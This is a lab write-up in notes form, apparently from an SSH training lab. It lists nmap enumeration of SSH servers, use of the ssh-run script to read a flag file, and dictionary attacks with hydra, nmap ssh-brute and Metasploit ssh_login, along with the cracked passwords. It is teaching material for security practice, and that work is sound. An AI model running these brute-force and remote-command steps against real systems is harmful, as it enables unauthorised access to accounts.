# SHH (Secure Shell)

`ip a`
`ping 192.28.51.3`
`nmap 192.28.51.3`
`nmap 192.28.51.3 -sV O`: runnng OpenSSH 7.2p2
`ssh root@192.28.51.3`
`nc 192.28.51.3`
`nmap 192.28.51.3 -p 22 --script ssh2-enum-algos`
`nmap 192.28.51.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
`nmap 192.28.51.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
`nmap 192.28.51.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"`
`ssh student@192.28.51.3`


We want to enumerate the version of the SSH server:
`nmap 192.28.51.3 -sV O`
**It runs OpenSSH 7.2p2

We want to fetch the banner using netcat:
`nc 192.28.51.3`
**SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6**

We need to enumerate the encryption_algorythms:
`nmap 192.28.51.3 -p 22 --script ssh2-enum-algos`
**6**

We want to find out by how many SSH servers the host key is being used:
`nmap 192.28.51.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
**The SSH uses the RSA public key (output with above command) to securely ecrypt client connecting to it.

We want to find out which authentification method is being used by the SSH server for user "student".
`nmap 192.28.51.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
**no auth. method is being used.**

We want to find out the same again, but this time with admin.
`nmap 192.28.51.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"`
**publickey, password**

We want to fetch the flag from /home/student/FLAG by using nmap ssh-run script:
`nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG,
ssh-run.username=student,ssh-run.password=" 192.201.39.3`

## SSH Dictionary Attack

`ip a`
`ping 192.35.81.3`
`nmap 192.35.81.3`
`nmap 192.35.81.3 -sV -p 22`
We want to find out the password of the user "student":
`gzip -d /usr/share/wordlists/rockyou.txt.gz`
`hydra -l student -P /usr/share/wordlists/rockyou.txt 192.35.81.3 ssh`
**friend**
`ssh student@192.35.81.3`: not much there, so we try administrator:
We want to find out the passwort of user "administrator" using nmap scripts with specific pw dictionary:
`echo "administrator" > user`
`nmap 192.35.81.3 -p 22 --script ssh-brute --script-args userdb=/root/user`
**password: sunshine**
Now we want to find the password of user "root" using ssh_login metasploit module with userpass dictionary
`msfconsole`
  msf5: `use auxiliary/scanner/ssh/ssh_login`
  msf5: `options`
  msf5: `set rhosts 192.35.81.3`
  msf5: `set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt`
  msf5: `set STOP_ON_SUCCESS true`
  msf5: `set verbose true`
  msf5: `options`
  msf5: `run`
  msf5: `exit`
**password: attack**
We wanna establish a ssh connection with the password we enumerated:
`ssh root@192.35.81.3`: insert attack
after login, we recieve the message of the day:
_SSH recon dictionary attack lab_
Questions

1. Find the password of user “student” using hydra.
2. Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
3. Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
4. What is the message of the day? (Printed after the user logs in to the SSH server).

